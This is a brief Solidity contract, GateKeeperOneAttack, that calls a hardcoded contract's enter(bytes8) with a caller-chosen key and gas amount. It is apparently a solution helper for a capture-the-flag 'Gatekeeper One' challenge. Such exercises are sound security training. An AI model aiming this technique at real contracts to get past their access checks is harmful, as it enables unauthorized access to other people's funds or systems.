// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperOneAttack {
    address public gatekeeper;

    constructor() {
        gatekeeper = 0xFb405a788b2Fc9a5c06ecDc86538796F0B1FB536;
    }

    function letMeIn(bytes8 key, uint256 _gas) public {
        gatekeeper.call{gas: _gas}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
}